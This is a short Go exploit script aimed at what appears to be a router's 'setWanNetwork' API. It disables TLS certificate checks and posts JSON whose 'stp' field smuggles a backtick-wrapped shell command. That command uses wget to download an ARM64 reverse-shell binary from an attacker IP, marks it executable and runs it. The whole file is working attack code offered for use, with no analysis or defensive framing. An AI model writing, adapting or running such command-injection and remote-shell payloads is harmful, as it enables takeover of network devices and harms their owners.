package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
)

func main() {
	target := "https://192.168.5.1/api/setWanNetwork"
	attackerIP := "192.168.5.200"

	// Download from port 8001
	cmd := fmt.Sprintf("wget http://%s:8001/revshell_arm64 -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh", attackerIP)
	payload := fmt.Sprintf(`{"wan":{"stp":"`+"`"+`%s`+"`"+`"}}`, cmd)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Post(target, "application/json", bytes.NewBufferString(payload))
	if err != nil {
		fmt.Printf("Failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	fmt.Printf("Status: %d\nBody: %s\n", resp.StatusCode, string(body))
}